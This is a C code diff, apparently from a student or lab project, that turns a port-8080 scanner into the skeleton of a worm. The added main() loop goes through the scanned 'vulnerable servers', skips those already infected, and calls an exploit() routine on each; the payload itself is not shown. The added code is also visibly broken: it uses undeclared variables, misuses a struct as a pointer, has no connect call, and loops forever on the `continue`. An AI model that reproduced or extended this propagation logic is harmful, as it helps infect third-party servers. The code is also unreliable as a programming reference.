@@ -8,7 +8,7 @@
 #define SERVER_PORT 8080
 
 struct cell_server {
-    unsigned long server_addr;
+    unsigned long IP;
     struct cell_server *Suivant;
 };
 
@@ -25,7 +25,7 @@ void Init_List(struct list_server * input){
 void Add_Beginning(struct list_server * list, unsigned long address){
 	struct cell_server * p_cell;
 	p_cell = malloc(sizeof(struct cell_server));
-	p_cell->server_addr = address;
+	p_cell->IP = address;
 
 	if (list->Debut == NULL && list->Fin == NULL){
 		list->Debut = p_cell;
@@ -44,7 +44,7 @@ void Add_Beginning(struct list_server * list, unsigned long address){
 void print_list(struct list_server * list){
 	struct cell_server * aux = list->Debut;
 	while(aux != NULL){
-		printf("%022lx ----> ",aux->server_addr);
+		printf("%022lx ----> ",aux->IP);
 		aux= aux->Suivant;
 	}
 	printf("NULL\n");
@@ -141,6 +141,33 @@ int main(int argc, char * argv[]) {
 	}
 	/* Scan IP given for server listening on port 8080
     then puts them in a linked list*/
-    scan_server_available(argv[1],argv[2]);
+    struct list_server my_list;
+	my_list = scan_server_available(argv[1],argv[2]);
+
+
+	// Create and initialize socket 
+	int my_sockfd;
+	struct sockaddr_in my_server_addr;
+	my_sockfd = socket(AF_INET, SOCK_STREAM, 0);
+	memset(&server_addr, 0, sizeof(server_addr));	
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(SERVER_PORT);
+
+
+	// Loops through the vulnerable servers 
+	struct cell_server * current;
+	current = my_list->Debut;
+	while(current!= NULL){
+		// Checks whether it has previously been infected 
+		if (is_infected()){
+			continue;
+		}
+		else{
+			// Setting up a client connection
+			server_addr.sin_addr.s_addr = current->IP;			// Launch exploit 
+			exploit(connfd);
+		}
+		current = current->Suivant;
+	}
     return 0;
 }
